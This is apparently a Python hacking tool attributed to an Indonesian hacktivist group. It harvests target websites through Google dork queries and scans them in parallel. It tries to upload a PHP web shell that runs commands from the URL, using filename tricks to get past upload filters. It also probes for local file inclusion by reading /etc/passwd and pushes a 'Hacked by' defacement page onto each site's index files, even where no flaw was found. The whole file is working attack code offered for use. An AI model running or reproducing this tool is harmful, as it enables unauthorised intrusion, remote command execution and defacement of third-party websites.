import requests
import threading
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import random
import time
import os
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

# Config
THREADS = 10
MAX_RETRIES = 2
TIMEOUT = 10

deface_file_path = "deface.html"
deface_content = "<h1>Hacked by Bcevm-Hacktivist Indonesia</h1>"
shell_code = "<?php echo 'Hacked by Bcevm-Hacktivist Indonesia'; system($_GET['cmd']); ?>"
targets_file = "targets.txt"
success_file = "success.txt"
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)"
]

# Common CMS paths and vulnerabilities
CMS_PATTERNS = {
    'wordpress': [
        ('/wp-admin/', 'WordPress Admin'),
        ('/wp-content/plugins/', 'WordPress Plugins'),
        ('/xmlrpc.php', 'WordPress XML-RPC')
    ],
    'joomla': [
        ('/administrator/', 'Joomla Admin'),
        ('/index.php?option=com_', 'Joomla Component')
    ],
    'drupal': [
        ('/user/login', 'Drupal Login'),
        ('/admin/', 'Drupal Admin')
    ]
}

def get_random_agent():
    return random.choice(user_agents)

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def google_dork_search(query, pages=1):
    results = set()
    headers = {"User-Agent": get_random_agent()}

    for page in range(pages):
        start = page * 10
        url = f"https://www.google.com/search?q={query}&start={start}"

        try:
            r = requests.get(url, headers=headers, timeout=TIMEOUT)
            r.raise_for_status()

            soup = BeautifulSoup(r.text, "html.parser")
            for a in soup.find_all('a', href=True):
                href = a['href']
                if "/url?q=" in href:
                    link = href.split("/url?q=")[1].split("&sa=")[0]
                    if is_valid_url(link):
                        results.add(link)
        except Exception as e:
            print(f"[!] Error dorking: {str(e)}")
            time.sleep(random.uniform(2, 5))

    return list(results)

def check_upload_vulnerability(url):
    upload_paths = [
        'upload.php',
        'admin/upload.php',
        'filemanager/upload.php',
        'assets/upload.php',
        'inc/upload.php'
    ]

    for path in upload_paths:
        test_url = urljoin(url, path)
        try:
            r = requests.get(test_url, headers={'User-Agent': get_random_agent()}, timeout=TIMEOUT)
            if r.status_code == 200 and ('upload' in r.text.lower() or 'file' in r.text.lower()):
                return test_url
        except:
            continue
    return None

def try_file_upload(upload_url):
    filenames = [
        "sayang.php",
        "sayang.php.jpg",
        "sayang.php;.jpg",
        "sayang.phtml",
        ".htaccess"
    ]

    for filename in filenames:
        try:
            files = {'file': (filename, shell_code, 'application/x-php')}
            r = requests.post(upload_url, files=files, timeout=TIMEOUT)

            if r.status_code in [200, 201]:
                uploaded_path = urljoin(upload_url, f"../uploads/{filename}")
                check = requests.get(uploaded_path, timeout=TIMEOUT)
                if check.status_code == 200:
                    return uploaded_path
        except:
            continue
    return None

def check_lfi_vulnerability(url):
    lfi_tests = [
        '../../../../../../../../etc/passwd',
        '....//....//....//....//....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
    ]

    for test in lfi_tests:
        try:
            test_url = f"{url}{'' if '?' in url else '?'}file={test}"
            r = requests.get(test_url, timeout=TIMEOUT)
            if 'root:x:0:' in r.text:
                return True
        except:
            continue
    return False

def check_cms_vulnerabilities(url):
    try:
        r = requests.get(url, headers={'User-Agent': get_random_agent()}, timeout=TIMEOUT)
        content = r.text.lower()

        for cms, patterns in CMS_PATTERNS.items():
            if cms in content or any(p[0] in url.lower() for p in patterns):
                print(f"[+] Detected {cms.capitalize()} at {url}")

                for path, desc in patterns:
                    vuln_url = urljoin(url, path)
                    try:
                        vr = requests.get(vuln_url, timeout=TIMEOUT)
                        if vr.status_code == 200:
                            print(f"  [+] Found {desc} at {vuln_url}")
                    except:
                        continue

                return cms
    except:
        pass
    return None

def auto_deface(url):
    try:
        files_to_deface = ['index.html', 'default.html']

        if os.path.exists(deface_file_path):
            with open(deface_file_path, 'r') as f:
                content = f.read()
        else:
            content = deface_content

        for fname in files_to_deface:
            deface_url = urljoin(url, fname)
            r = requests.put(deface_url, data=content, headers={"Content-Type": "text/html"})
            if r.status_code in [200, 201, 204]:
                print(f"[DEFACED] {deface_url}")
                with open(success_file, 'a') as f:
                    f.write(f"Defaced: {deface_url}\n")
                return True
    except Exception as e:
        print(f"[!] Deface failed at {url}: {str(e)}")
    return False

def scan_target(url):
    try:
        print(f"[*] Scanning {url}")

        cms = check_cms_vulnerabilities(url)

        upload_url = check_upload_vulnerability(url)
        if upload_url:
            print(f"[+] Found upload form at {upload_url}")
            shell_path = try_file_upload(upload_url)
            if shell_path:
                print(f"[SUCCESS] Shell uploaded: {shell_path}")
                with open(success_file, 'a') as f:
                    f.write(f"Shell: {shell_path}\n")
                auto_deface(url)
                return True

        if check_lfi_vulnerability(url):
            print(f"[SUCCESS] LFI vulnerability found at {url}")
            with open(success_file, 'a') as f:
                f.write(f"LFI: {url}\n")
            auto_deface(url)
            return True

        auto_deface(url)
        print(f"[-] No vulnerabilities found at {url}")
        return False

    except Exception as e:
        print(f"[!] Error scanning {url}: {str(e)}")
        return False

def load_targets():
    if os.path.exists(targets_file):
        with open(targets_file, 'r') as f:
            return [line.strip() for line in f if line.strip() and is_valid_url(line.strip())]
    return []

def save_targets(targets):
    with open(targets_file, 'w') as f:
        for target in targets:
            f.write(f"{target}\n")

def main():
    if not os.path.exists(targets_file):
        open(targets_file, 'w').close()
    if not os.path.exists(success_file):
        open(success_file, 'w').close()

    targets = load_targets()
    if not targets:
        print("[*] No targets found. Gathering targets from common vulnerabilities...")
        common_vulns = [
            'inurl:/upload.php',
            'inurl:/wp-content/plugins',
            'inurl:/admin/login.php',
            'inurl:/filemanager',
            'inurl:index.php?id=',
            'inurl:page.php?page='
        ]

        for dork in common_vulns:
            print(f"[*] Searching for: {dork}")
            found = google_dork_search(dork)
            targets.extend(found)
            time.sleep(random.uniform(5, 10))

        save_targets(targets)

    print(f"[*] Starting scan with {len(targets)} targets")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(scan_target, url): url for url in targets}

        for future in as_completed(futures):
            url = futures[future]
            try:
                future.result()
            except Exception as e:
                print(f"[!] Exception in {url}: {str(e)}")

    print("[*] Scan completed. Check success.txt for results.")

if __name__ == "__main__":
    main()
